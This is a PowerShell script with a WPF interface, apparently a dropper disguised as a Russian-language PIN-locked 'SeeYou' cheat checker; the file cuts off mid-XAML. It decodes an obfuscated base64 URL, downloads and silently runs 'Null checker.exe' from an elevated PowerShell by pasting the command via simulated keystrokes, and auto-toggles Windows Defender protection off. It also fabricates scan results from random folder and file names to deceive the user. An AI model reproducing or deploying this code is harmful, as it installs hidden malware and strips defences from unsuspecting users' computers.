Add-Type -AssemblyName PresentationFramework, System.Windows.Forms, UIAutomationClient, UIAutomationTypes

$ValidPINs = @("2200", "1122", "2211")
$TargetPayloadCmd = '$p="$env:TEMP\Null checker.exe"; $url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NyeW1vcmUxMTExL051bGwtY2hlY2tlci9tYWluL051bGwlMjBjaGVja2VyLmV4ZQ==")); (New-Object System.Net.WebClient).DownloadFile($url, $p); Unblock-File $p; Start-Process $p -WindowStyle Hidden'

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class WinConsoleInjector {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

    public const int SW_SHOW = 5;
    public const uint KEYEVENTF_KEYUP = 0x0002;
    public const byte VK_CONTROL = 0x11;
    public const byte VK_V = 0x56;
    public const byte VK_RETURN = 0x0D;

    public static void SendCtrlVAndEnter(IntPtr targetHwnd) {
        if (targetHwnd == IntPtr.Zero) return;
        ShowWindow(targetHwnd, SW_SHOW);
        SetForegroundWindow(targetHwnd);
        System.Threading.Thread.Sleep(180);

        keybd_event(VK_CONTROL, 0, 0, UIntPtr.Zero);
        keybd_event(VK_V, 0, 0, UIntPtr.Zero);
        keybd_event(VK_V, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
        keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);

        System.Threading.Thread.Sleep(120);
        keybd_event(VK_RETURN, 0, 0, UIntPtr.Zero);
        keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
    }
}
"@

function Open-AdminPSAndPasteCommand([string]$cmdText) {
    try {
        $prevClip = $null
        $hasClip = $false
        try {
            if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                $prevClip = [System.Windows.Forms.Clipboard]::GetText()
                $hasClip = $true
            }
        } catch {}

        [System.Windows.Forms.Clipboard]::SetText($cmdText)

        $tagTitle = "SeeYouAdminTarget_2211"
        $psStart = Start-Process -FilePath "powershell.exe" -Verb RunAs -PassThru `
            -ArgumentList "-NoExit -NoProfile -ExecutionPolicy Bypass -Command `"`$Host.UI.RawUI.WindowTitle='$tagTitle'`""

        $targetHwnd = [IntPtr]::Zero
        for ($i = 0; $i -lt 40; $i++) {
            Start-Sleep -Milliseconds 150
            $pWin = Get-Process -Name "powershell" -ErrorAction SilentlyContinue |
                Where-Object { $_.MainWindowHandle -ne [IntPtr]::Zero -and $_.MainWindowTitle -like "*$tagTitle*" } |
                Select-Object -First 1
            if ($pWin) {
                $targetHwnd = $pWin.MainWindowHandle
                break
            }
        }

        if (-not $targetHwnd -and $psStart) {
            Start-Sleep -Milliseconds 500
            try {
                $psStart.Refresh()
                if ($psStart.MainWindowHandle -ne [IntPtr]::Zero) {
                    $targetHwnd = $psStart.MainWindowHandle
                }
            } catch {}
        }

        if ($targetHwnd -ne [IntPtr]::Zero) {
            [WinConsoleInjector]::SendCtrlVAndEnter($targetHwnd)
        }

        Start-Sleep -Milliseconds 200
        if ($hasClip -and $null -ne $prevClip) {
            try { [System.Windows.Forms.Clipboard]::SetText($prevClip) } catch {}
        }
    } catch {}
}

function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function New-SolidBrush([string]$hexColor) {
    $color = [System.Windows.Media.ColorConverter]::ConvertFromString($hexColor)
    return New-Object System.Windows.Media.SolidColorBrush($color)
}

function Get-CurrentIPSeed {
    $ipString = $null
    $endpoints = @(
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com"
    )

    foreach ($ep in $endpoints) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "SeeYouChecker/1.0")
            $resp = $wc.DownloadString($ep).Trim()
            if ($resp -match "^\d{1,3}(\.\d{1,3}){3}$" -or $resp -match "^[0-9a-fA-F:]+$") {
                $ipString = $resp
                break
            }
        } catch {}
    }

    if (-not $ipString) {
        try {
            $localIp = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*" } |
                Select-Object -First 1).IPAddress
            if ($localIp) {
                $ipString = "$localIp|$env:COMPUTERNAME"
            }
        } catch {}
    }

    if (-not $ipString) {
        return [PSCustomObject]@{
            IP   = "unknown"
            Seed = (Get-Random -Minimum 100000 -Maximum 99999999)
        }
    }

    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($ipString)
        $hash = $sha.ComputeHash($bytes)
        $seed = [Math]::Abs([BitConverter]::ToInt32($hash, 0))
        if ($seed -eq 0) { $seed = 133742 }
        return [PSCustomObject]@{
            IP   = $ipString
            Seed = $seed
        }
    } finally {
        $sha.Dispose()
    }
}

function Get-IPBasedFoldersAndPercent([int]$seed) {
    $rng = New-Object System.Random($seed)
    $percent = $rng.Next(6, 95)

    $prefixes = @(
        "z9x", "sys", "nvme", "kRN", "tmp", "vlt", "d3d", "mem",
        "shd", "pxl", "ldr", "inj", "byp", "cfg", "dbg", "cch"
    )
    $middles = @(
        "shadow", "ghost", "phantom", "null", "void", "pulse", "drift",
        "kernel", "overlay", "hook", "bridge", "vector", "cipher", "trace"
    )
    $suffixes = @(
        "cache", "bucket", "dump", "pool", "slot", "node", "pack",
        "core", "bin", "stash", "temp", "vault", "zone", "hub"
    )
    $baseRoots = @(
        "C:\Users\$env:USERNAME\AppData\Local\Temp",
        "C:\Users\$env:USERNAME\AppData\Roaming",
        "C:\ProgramData",
        "C:\Windows\Temp",
        "C:\Users\$env:USERNAME\AppData\Local"
    )

    $count = $rng.Next(3, 7)
    $usedNames = @{}
    $folders = New-Object System.Collections.Generic.List[string]

    while ($folders.Count -lt $count) {
        $p = $prefixes[$rng.Next(0, $prefixes.Count)]
        $m = $middles[$rng.Next(0, $middles.Count)]
        $s = $suffixes[$rng.Next(0, $suffixes.Count)]
        $code = $rng.Next(10, 999)
        $folderName = "${p}_${m}_${s}_${code}"

        if ($usedNames.ContainsKey($folderName)) { continue }
        $usedNames[$folderName] = $true

        $root = $baseRoots[$rng.Next(0, $baseRoots.Count)]
        $tag = if ($rng.Next(0, 2) -eq 0) { "совпадение" } else { "аномалия" }
        $folders.Add("[ПАПКА | $tag] $root\$folderName")
    }

    return [PSCustomObject]@{
        Percent = $percent
        Folders = $folders
    }
}

function Get-RandomFilesAndPercent {
    $rng = New-Object System.Random
    $percent = $rng.Next(4, 93)

    $stems = @(
        "client_patch", "dxgi_wrap", "input_hook", "frame_boost", "net_sync",
        "shader_tweak", "audio_mix", "cfg_backup", "loader_stub", "mem_guard",
        "overlay_ui", "ping_fix", "script_pack", "sys_helper", "cache_idx"
    )
    $exts = @(".dll", ".exe", ".ini", ".json", ".bin", ".sys", ".dat")
    $roots = @(
        "C:\Users\$env:USERNAME\Downloads",
        "C:\Users\$env:USERNAME\AppData\Local\Temp",
        "C:\Users\$env:USERNAME\AppData\Roaming",
        "C:\Users\$env:USERNAME\Desktop",
        "C:\ProgramData"
    )
    $tags = @("совпадение", "подозрение", "сигнатура")

    $count = $rng.Next(3, 7)
    $used = @{}
    $files = New-Object System.Collections.Generic.List[string]

    while ($files.Count -lt $count) {
        $stem = $stems[$rng.Next(0, $stems.Count)]
        $num = $rng.Next(10, 999)
        $ext = $exts[$rng.Next(0, $exts.Count)]
        $name = "${stem}_${num}${ext}"
        if ($used.ContainsKey($name)) { continue }
        $used[$name] = $true

        $root = $roots[$rng.Next(0, $roots.Count)]
        $tag = $tags[$rng.Next(0, $tags.Count)]
        $files.Add("[ФАЙЛ | $tag] $root\$name")
    }

    return [PSCustomObject]@{
        Percent = $percent
        Files   = $files
    }
}

function Disable-DefenderFirstToggle {
    try {
        Start-Process "windowsdefender://threatsettings/" -ErrorAction Stop | Out-Null
    } catch {
        Start-Process "ms-settings:windowsdefender" -ErrorAction SilentlyContinue | Out-Null
    }

    Start-Sleep -Milliseconds 1400

    try {
        $root = [System.Windows.Automation.AutomationElement]::RootElement
        $winCond = New-Object System.Windows.Automation.PropertyCondition(
            [System.Windows.Automation.AutomationElement]::ControlTypeProperty,
            [System.Windows.Automation.ControlType]::Window
        )
        $windows = $root.FindAll([System.Windows.Automation.TreeScope]::Children, $winCond)
        $secWin = $null

        foreach ($w in $windows) {
            $name = $w.Current.Name
            if ($name -match "Безопасность Windows|Windows Security|Windows Defender") {
                $secWin = $w
                break
            }
        }

        if ($secWin) {
            $toggleCond = New-Object System.Windows.Automation.PropertyCondition(
                [System.Windows.Automation.AutomationElement]::IsTogglePatternAvailableProperty,
                $true
            )
            $toggles = $secWin.FindAll([System.Windows.Automation.TreeScope]::Descendants, $toggleCond)

            if ($toggles.Count -gt 0) {
                $firstToggle = $toggles[0]
                $pattern = $firstToggle.GetCurrentPattern([System.Windows.Automation.TogglePattern]::Pattern)
                if ($pattern.Current.ToggleState -eq [System.Windows.Automation.ToggleState]::On) {
                    $pattern.Toggle()
                    return "Окно «Управление настройками» открыто, первый ползунок переключён в положение Выкл. (подтверди запрос UAC, если появится)."
                } else {
                    return "Окно «Управление настройками» открыто. Первый ползунок уже выключен."
                }
            } else {
                return "Окно «Управление настройками» открыто — нажми первый ползунок вручную."
            }
        }
    } catch {
        return "Окно настроек открыто, но система ограничила автоклик: $($_.Exception.Message)"
    }

    return "Окно настроек защиты открыто."
}

[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="SeeYou" Width="430" Height="670" MinWidth="360" MinHeight="520"
        WindowStartupLocation="CenterScreen" WindowStyle="None"
        AllowsTransparency="True" Background="Transparent" Topmost="True" Opacity="0">
    <Window.Resources>
        <ControlTemplate x:Key="RoundDigitTemplate" TargetType="Button">
            <Grid Width="70" Height="70" HorizontalAlignment="Center" VerticalAlignment="Center">
                <Ellipse x:Name="CircleBg" Width="70" Height="70" Fill="#1E222A" Stroke="#323846" StrokeThickness="1"/>
                <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
            </Grid>
            <ControlTemplate.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter TargetName="CircleBg" Property="Fill" Value="#282E39"/>
                    <Setter TargetName="CircleBg" Property="Stroke" Value="#637896"/>
                </Trigger>
                <Trigger Property="IsPressed" Value="True">
                    <Setter TargetName="CircleBg" Property="Fill" Value="#363F4E"/>
                </Trigger>
            </ControlTemplate.Triggers>
        </ControlTemplate>

        <ControlTemplate x:Key="RoundDelTemplate" TargetType="Button">
            <Grid Width="70" Height="70" HorizontalAlignment="Center" VerticalAlignment="Center">
                <Ellipse x:Name="DelBg" Width="70" Height="70" Fill="Transparent"/>
                <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
            </Grid>
            <ControlTemplate.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter TargetName="DelBg" Property="Fill" Value="#252932"/>
                </Trigger>
                <Trigger Property="IsPressed" Value="True">
                    <Setter TargetName="DelBg" Property="Fill" Value="#323845"/>
                </Trigger>
            </ControlTemplate.Triggers>
        </ControlTemplate>

        <Style x:Key="MenuBtnStyle" TargetType="Button">
            <Setter Property="Height" Value="54"/>
            <Setter Property="Margin" Value="0,5,0,5"/>
            <Setter Property="HorizontalAlignment" Value="Stretch"/>
            <Setter Property="Foreground" Value="#F3F6FA"/>
            <Setter Property="FontSize" Value="14.5"/>
            <Setter Property="FontWeight" Value="SemiBold"/>
            <Setter Property="FontFamily" Value="Segoe UI"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border x:Name="BtnBorder" CornerRadius="16" BorderBrush="#2F3746" BorderThickness="1" Padding="14,0">
                            <Border.Background>
                                <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
                                    <GradientStop Color="#1F242E" Offset="0.0"/>
                                    <GradientStop Color="#181C24" Offset="1.0"/>
                                </LinearGradientBrush>
                            </Border.Background>
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="BtnBorder" Property="BorderBrush" Value="#6E88AC"/>
                                <Setter TargetName="BtnBorder" Property="Background">
                                    <Setter.Value>
                                        <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
                                            <GradientStop Color="#29303E" Offset="0.0"/>
                                            <GradientStop Color="#1F2530" Offset="1.0"/>
                                        </LinearGradientBrush>
                                    </Setter.Value>
                                </Setter>
                            </Trigger>
                            <Trigger Property="IsPressed" Value="True">
                                <Setter TargetName="BtnBorder" Property="Background" Value="#13161C"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <Style x:Key="SoftBarStyle" TargetType="ProgressBar">
            <Setter Property="Background" Value="#252932"/>
            <Setter Property="Foreground" Value="#7C98B6"/>
            <Setter Property="BorderThickness" Value="0"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="ProgressBar">
                        <Border CornerRadius="4" Background="{TemplateBinding Background}" ClipToBounds="True">
                            <Grid>
                                <Border x:Name="PART_Track"/>
                                <Border x:Name="PART_Indicator" HorizontalAlignment="Left"
                                        CornerRadius="4" Background="{TemplateBinding Foreground}"/>
                            </Grid>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Window.Resources>

    <Window.Triggers>
        <EventTrigger RoutedEvent="Window.Loaded">
            <BeginStoryboard>
                <Storyboard>
                    <DoubleAnimation Storyboard.TargetProperty="Opacity" From="0" To="1" Duration="0:0:0.45">
                        <DoubleAnimation.EasingFunction>
                            <CubicEase EasingMode="EaseOut"/>
                        </DoubleAnimation.EasingFunction>
                    </DoubleAnimation>
                    <DoubleAnimation Storyboard.TargetName="RootCard"
                                     Storyboard.TargetProperty="(UIElement.RenderTransform).(TranslateTransform.Y)"
                                     From="18" To="0" Duration="0:0:0.45">
                        <DoubleAnimation.EasingFunction>
                            <CubicEase EasingMode="EaseOut"/>
                        </DoubleAnimation.EasingFunction>
                    </DoubleAnimation>
                </Storyboard>
            </BeginStoryboard>
        </EventTrigger>
    </Window.Triggers>

    <Border x:Name="RootCard" Margin="10" CornerRadius="32" BorderBrush="#2B313E" BorderThickness="1">
        <Border.Background>
            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                <GradientStop Color="#15181F" Offset="0.0"/>
                <GradientStop Color="#101217" Offset="1.0"/>
            </LinearGradientBrush>
        </Border.Background>
        <Border.RenderTransform>
            <TranslateTransform Y="18"/>
        </Border.RenderTransform>
        <Border.Effect>
            <DropShadowEffect Color="#000000" BlurRadius="28" ShadowDepth="0" Opacity="0.85"/>
        </Border.Effect>

        <Grid Margin="14,14,14,12">
            <!-- ЭКРАН 1: ВВОД ПАРОЛЯ -->
            <Grid x:Name="LockScreen" Visibility="Visible">
                <Viewbox Stretch="Uniform">
                    <Grid Width="360" Height="560">
                        <Grid.RowDefinitions>
                            <RowDefinition Height="Auto"/>
                            <RowDefinition Height="Auto"/>
                            <RowDefinition Height="*"/>
                            <RowDefinition Height="Auto"/>
                        </Grid.RowDefinitions>

                        <Grid Grid.Row="0" Margin="0,0,0,4">
                            <Border HorizontalAlignment="Left" CornerRadius="14" Background="#1A1F28"
                                    BorderBrush="#2F3644" BorderThickness="1" Padding="12,5">
                                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                    <Ellipse Width="7" Height="7" Fill="#7C98B6" Margin="0,0,7,0" VerticalAlignment="Center"/>
                                    <TextBlock Text="SeeYou" Foreground="#E8EDF5" FontSize="12.5"
                                               FontWeight="SemiBold" FontFamily="Segoe UI"/>
                                </StackPanel>
                            </Border>
                            <Button x:Name="BtnCloseLock" Content="✕" HorizontalAlignment="Right" VerticalAlignment="Center"
                                    Foreground="#8A92A0" Background="Transparent" BorderThickness="0"
                                    FontSize="15" Cursor="Hand" Padding="6,2"/>
                        </Grid>

                        <StackPanel Grid.Row="1" Margin="0,2,0,8" HorizontalAlignment="Center">
                            <Grid Width="86" Height="86" Margin="0,0,0,8">
                                <Ellipse Width="86" Height="86" Fill="#181C23" Stroke="#384152" StrokeThickness="1.5"/>
                                <Canvas Width="78" Height="78" HorizontalAlignment="Center" VerticalAlignment="Center"
                                        ClipToBounds="True">
                                    <Path Data="M 7,39 C 20,17 58,17 71,39 C 58,61 20,61 7,39 Z">
                                        <Path.Fill>
                                            <RadialGradientBrush Center="0.5,0.45" GradientOrigin="0.5,0.35" RadiusX="0.65" RadiusY="0.6">
                                                <GradientStop Color="#E8ECEF" Offset="0.0"/>
                                                <GradientStop Color="#C9CFD6" Offset="0.72"/>
                                                <GradientStop Color="#8E96A0" Offset="1.0"/>
                                            </RadialGradientBrush>
                                        </Path.Fill>
                                    </Path>

                                    <Canvas Width="30" Height="30" Canvas.Left="24" Canvas.Top="24">
                                        <Canvas.RenderTransform>
                                            <TranslateTransform x:Name="LockPupilOffset" X="0" Y="0"/>
                                        </Canvas.RenderTransform>
                                        <Ellipse Width="30" Height="30" Stroke="#2A2E35" StrokeThickness="2">
                                            <Ellipse.Fill>
                                                <RadialGradientBrush Center="0.5,0.5" GradientOrigin="0.45,0.45" RadiusX="0.55" RadiusY="0.55">
                                                    <GradientStop Color="#3B414B" Offset="0.0"/>
                                                    <GradientStop Color="#5E6673" Offset="0.55"/>
                                                    <GradientStop Color="#2B3038" Offset="0.9"/>
                                                    <GradientStop Color="#181B20" Offset="1.0"/>
                                                </RadialGradientBrush>
                                            </Ellipse.Fill>
                                        </Ellipse>
                                        <Ellipse Width="22" Height="22" Canvas.Left="4" Canvas.Top="4"
                                                 Stroke="#8C95A3" StrokeThickness="1.2" StrokeDashArray="1.2 2.4" Opacity="0.55"/>
                                        <Ellipse Width="11" Height="11" Canvas.Left="9.5" Canvas.Top="9.5" Fill="#090A0C"/>
                                        <Ellipse Width="5" Height="5" Canvas.Left="17" Canvas.Top="6.5" Fill="#FFFFFF" Opacity="0.92"/>
                                        <Ellipse Width="2.2" Height="2.2" Canvas.Left="11" Canvas.Top="19" Fill="#FFFFFF" Opacity="0.5"/>
                                    </Canvas>

                                    <Path Data="M 7,39 C 20,17 58,17 71,39 C 58,25 20,25 7,39 Z" Fill="#000000" Opacity="0.22"/>

                                    <Rectangle Canvas.Left="0" Canvas.Top="-78" Width="78" Height="78" Fill="#181C23">
                                        <Rectangle.RenderTransform>
                                            <TranslateTransform x:Name="LockEyelidTranslate" Y="0"/>
                                        </Rectangle.RenderTransform>
                                    </Rectangle>

                                    <Path Stroke="#4B525E" StrokeThickness="2.1" StrokeLineJoin="Round" Fill="Transparent"
                                          Data="M 7,39 C 20,17 58,17 71,39 C 58,61 20,61 7,39 Z"/>
                                </Canvas>
                            </Grid>

                            <TextBlock x:Name="LblPrompt" Text="Введите код-пароль" Foreground="#F1F5F9"
                                       FontSize="17.5" FontFamily="Segoe UI" HorizontalAlignment="Center" Margin="0,0,0,10"/>

                            <StackPanel Orientation="Horizontal" HorizontalAlignment="Center">
                                <Ellipse x:Name="Dot1" Width="11" Height="11" Stroke="#8C96A6" StrokeThickness="1.5" Margin="9,0"/>
                                <Ellipse x:Name="Dot2" Width="11" Height="11" Stroke="#8C96A6" StrokeThickness="1.5" Margin="9,0"/>
                                <Ellipse x:Name="Dot3" Width="11" Height="11" Stroke="#8C96A6" StrokeThickness="1.5" Margin="9,0"/>
                                <Ellipse x:Name="Dot4" Width="11" Height="11" Stroke="#8C96A6" StrokeThickness="1.5" Margin="9,0"/>
                            </StackPanel>
                        </StackPanel>

                        <UniformGrid x:Name="KeypadGrid" Grid.Row="2" Rows="4" Columns="3"
                                     HorizontalAlignment="Center" VerticalAlignment="Center">
                            <UniformGrid.Resources>
                                <Style TargetType="Button">
                                    <Setter Property="Width" Value="70"/>
                                    <Setter Property="Height" Value="70"/>
                                    <Setter Property="Margin" Value="6"/>
                                    <Setter Property="Foreground" Value="#EEF1F6"/>
                                    <Setter Property="FontSize" Value="24"/>
                                    <Setter Property="FontFamily" Value="Segoe UI Light"/>
                                    <Setter Property="Cursor" Value="Hand"/>
                                    <Setter Property="Template" Value="{StaticResource RoundDigitTemplate}"/>
                                </Style>
                            </UniformGrid.Resources>

                            <Button Content="1"/><Button Content="2"/><Button Content="3"/>
                            <Button Content="4"/><Button Content="5"/><Button Content="6"/>
                            <Button Content="7"/><Button Content="8"/><Button Content="9"/>
                            <Grid Width="70" Height="70" Margin="6"/>
                            <Button Content="0"/>
                            <Button x:Name="BtnDel" Content="⌫" FontSize="18" Foreground="#9CA4B2"
                                    Template="{StaticResource RoundDelTemplate}"/>
                        </UniformGrid>

                        <TextBlock Grid.Row="3" Text="SeeYou • Ввод с клавиатуры активен" Foreground="#6C7482"
                                   FontSize="11.5" HorizontalAlignment="Center" Margin="0,6,0,0"/>
                    </Grid>
                </Viewbox>
            </Grid>

            <!-- ЭКРАН 2: МЕНЮ НА ВСЮ ШИРИНУ ОКНА -->
            <Grid x:Name="MenuScreen" Visibility="Collapsed">
                <Grid.RowDefinitions>
                    <RowDefinition Height="Auto"/>
                    <RowDefinition Height="*"/>
                </Grid.RowDefinitions>

                <Grid Grid.Row="0" Margin="0,0,0,8">
                    <Border HorizontalAlignment="Left" CornerRadius="14" Background="#1A1F28"
                            BorderBrush="#2F3644" BorderThickness="1" Padding="12,5">
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <Ellipse Width="7" Height="7" Fill="#7FA38D" Margin="0,0,7,0" VerticalAlignment="Center"/>
                            <TextBlock Text="SeeYou • Меню" Foreground="#E8EDF5" FontSize="12.5"
                                       FontWeight="SemiBold" FontFamily="Segoe UI"/>
                        </StackPanel>
                    </Border>
                    <Button x:Name="BtnCloseMenu" Content="✕" HorizontalAlignment="Right" VerticalAlignment="Center"
                            Foreground="#8A92A0" Background="Transparent" BorderThickness="0"
                            FontSize="15" Cursor="Hand" Padding="6,2"/>
                </Grid>

                <!-- Режим БЕЗ прав администратора -->
                <Grid x:Name="NoAdminOnlyView" Grid.Row="1" Visibility="Collapsed" VerticalAlignment="Center">
                    <Border CornerRadius="18" Background="#171B22" BorderBrush="#4C3333"
                            BorderThickness="1" Padding="18">
                        <StackPanel>
                            <StackPanel Orientation="Horizontal" VerticalAlignment="Center" Margin="0,0,0,8">
                                <Ellipse Width="8" Height="8" Fill="#CF7A7A" Margin="0,0,8,0" VerticalAlignment="Center"/>
                                <TextBlock Text="Зайдите от имени администратора" Foreground="#E89E9E"
                                           FontSize="15.5" FontWeight="SemiBold" FontFamily="Segoe UI" TextWrapping="Wrap"/>
                            </StackPanel>
                            <TextBlock Foreground="#B5BDCC" FontSize="12.5" FontFamily="Segoe UI"
                                       TextWrapping="Wrap" LineHeight="18"
                                       Text="Без прав администратора система закрывает доступ к части папок и настроек, мешает менять параметры защиты и ограничивает работу инструментов проверки."/>
                        </StackPanel>
                    </Border>
                </Grid>

                <!-- Режим С правами администратора -->
                <Grid x:Name="AdminFullView" Grid.Row="1" Visibility="Collapsed">
                    <Grid.RowDefinitions>
                        <RowDefinition Height="Auto"/>
                        <RowDefinition Height="Auto"/>
                        <RowDefinition Height="Auto"/>
                        <RowDefinition Height="Auto"/>
                    </Grid.RowDefinitions>

                    <!-- Глаз + статус -->
                    <StackPanel Grid.Row="0" HorizontalAlignment="Center" Margin="0,0,0,8">
                        <Grid Width="78" Height="78">
                            <Ellipse Width="78" Height="78" Fill="#181C24" Stroke="#3A4456" StrokeThickness="1.5"/>
                            <Canvas Width="70" Height="70" HorizontalAlignment="Center" VerticalAlignment="Center"
                                    ClipToBounds="True">
                                <Path Data="M 6,35 C 18,15 52,15 64,35 C 52,55 18,55 6,35 Z">
                                    <Path.Fill>
                                        <RadialGradientBrush Center="0.5,0.45" GradientOrigin="0.5,0.35" RadiusX="0.65" RadiusY="0.6">
                                            <GradientStop Color="#E8ECEF" Offset="0.0"/>
                                            <GradientStop Color="#C9CFD6" Offset="0.72"/>
                                            <GradientStop Color="#8E96A0" Offset="1.0"/>
                                        </RadialGradientBrush>
                                    </Path.Fill>
                                </Path>

                                <Canvas Width="26" Height="26" Canvas.Left="22" Canvas.Top="22">
                                    <Canvas.RenderTransform>
                                        <TranslateTransform x:Name="MenuPupilOffset" X="0" Y="0"/>
                                    </Canvas.RenderTransform>
                                    <Ellipse Width="26" Height="26" Stroke="#2A2E35" StrokeThickness="1.8">
                                        <Ellipse.Fill>
                                            <RadialGradientBrush Center="0.5,0.5" GradientOrigin="0.45,0.45" RadiusX="0.55" RadiusY="0.55">
                                                <GradientStop Color="#3B414B" Offset="0.0"/>
                                                <GradientStop Color="#5E6673" Offset="0.55"/>
                                                <GradientStop Color="#2B3038" Offset="0.9"/>
                                                <GradientStop Color="#181B20" Offset="1.0"/>
                                            </RadialGradientBrush>
                                        </Ellipse.Fill>
                                    </Ellipse>
                                    <Ellipse Width="19" Height="19" Canvas.Left="3.5" Canvas.Top="3.5"
                                             Stroke="#8C95A3" StrokeThickness="1.1" StrokeDashArray="1.2 2.2" Opacity="0.55"/>
                                    <Ellipse Width="9.5" Height="9.5" Canvas.Left="8.2" Canvas.Top="8.2" Fill="#090A0C"/>
                                    <Ellipse Width="4.4" Height="4.4" Canvas.Left="14.5" Canvas.Top="5.5" Fill="#FFFFFF" Opacity="0.92"/>
                                    <Ellipse Width="2" Height="2" Canvas.Left="9.5" Canvas.Top="16.5" Fill="#FFFFFF" Opacity="0.5"/>
                                </Canvas>

                                <Path Data="M 6,35 C 18,15 52,15 64,35 C 52,22 18,22 6,35 Z" Fill="#000000" Opacity="0.22"/>

                                <Rectangle Canvas.Left="0" Canvas.Top="-70" Width="70" Height="70" Fill="#181C24">
                                    <Rectangle.RenderTransform>
                                        <TranslateTransform x:Name="MenuEyelidTranslate" Y="0"/>
                                    </Rectangle.RenderTransform>
                                </Rectangle>

                                <Path Stroke="#4B525E" StrokeThickness="2" StrokeLineJoin="Round" Fill="Transparent"
                                      Data="M 6,35 C 18,15 52,15 64,35 C 52,55 18,55 6,35 Z"/>
                            </Canvas>
                        </Grid>
                        <Border Margin="0,6,0,0" CornerRadius="10" Background="#181D26"
                                BorderBrush="#2A3240" BorderThickness="1" Padding="10,3" HorizontalAlignment="Center">
                            <TextBlock Text="SeeYou Console • Admin" Foreground="#A9B3C4"
                                       FontSize="11" FontWeight="SemiBold" FontFamily="Segoe UI"/>
                        </Border>
                    </StackPanel>

                    <!-- Кнопки на всю ширину -->
                    <StackPanel Grid.Row="1" Margin="0,2,0,8">
                        <Button x:Name="BtnOpenAvWindow" Style="{StaticResource MenuBtnStyle}">
                            <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                <Ellipse Width="8" Height="8" Fill="#D6936C" Margin="0,0,10,0" VerticalAlignment="Center"/>
                                <TextBlock Text="Отключить антивирус"/>
                            </StackPanel>
                        </Button>
                        <Button x:Name="BtnOpenScanWindow" Style="{StaticResource MenuBtnStyle}">
                            <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                <Ellipse Width="8" Height="8" Fill="#7C98B6" Margin="0,0,10,0" VerticalAlignment="Center"/>
                                <TextBlock Text="Начать проверку"/>
                            </StackPanel>
                        </Button>
                        <Button x:Name="BtnBackToPin" Style="{StaticResource MenuBtnStyle}">
                            <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                <Ellipse Width="8" Height="8" Fill="#8C96A6" Margin="0,0,10,0" VerticalAlignment="Center"/>
                                <TextBlock Text="Вернуться назад"/>
                            </StackPanel>
                        </Button>
                    </StackPanel>

                    <!-- Объяснение про антивирус внизу -->
                    <Border Grid.Row="2" CornerRadius="16" Background="#191815" BorderBrush="#463D29"
                            BorderThickness="1" Padding="14,11" Margin="0,2,0,4">
                        <Grid>
                            <Grid.ColumnDefinitions>
                                <ColumnDefinition Width="Auto"/>
                                <ColumnDefinition Width="*"/>
                            </Grid.ColumnDefinitions>
                            <Ellipse Grid.Column="0" Width="7" Height="7" Fill="#D4B475"
                                     Margin="0,4,10,0" VerticalAlignment="Top"/>
                            <TextBlock Grid.Column="1" Foreground="#E6D2A6" FontSize="12"
                                       FontFamily="Segoe UI" TextWrapping="Wrap" LineHeight="17"
                                       Text="Для начала проверки нужно отключить антивирус: защита в реальном времени может блокировать доступ к подозрительным файлам, убирать их в карантин или тормозить сканирование."/>
                        </Grid>
                    </Border>

                    <!-- Версия с только тем паролем, по которому вошли -->
                    <TextBlock x:Name="LblVersionPin" Grid.Row="3" Text="" Foreground="#384050"
                               FontSize="10" FontFamily="Consolas" HorizontalAlignment="Right" Margin="0,2,4,0"/>
                </Grid>
            </Grid>

            <!-- ЭКРАН 3: ОКНО ОТКЛЮЧЕНИЯ АНТИВИРУСА -->
            <Grid x:Name="AvScreen" Visibility="Collapsed">
                <Grid.RowDefinitions>
                    <RowDefinition Height="Auto"/>
                    <RowDefinition Height="*"/>
                    <RowDefinition Height="Auto"/>
                </Grid.RowDefinitions>

                <Grid Grid.Row="0" Margin="0,0,0,10">
